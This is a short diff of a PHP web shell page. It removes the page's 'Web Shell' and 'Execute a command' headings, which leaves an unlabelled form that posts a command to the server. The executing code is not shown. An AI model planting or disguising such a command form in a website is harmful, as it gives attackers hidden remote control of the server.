@@ -63,8 +63,6 @@
 </head>
 <body>
     <main>
-        <h1>Web Shell</h1>
-        <h2>Execute a command</h2>
         <form method="post">
             <label for="cmd"><strong>Command</strong></label>
             <div class="form-group">
@@ -83,4 +81,3 @@
         <?php endif; ?>
     </main>
 </body>
-</html>
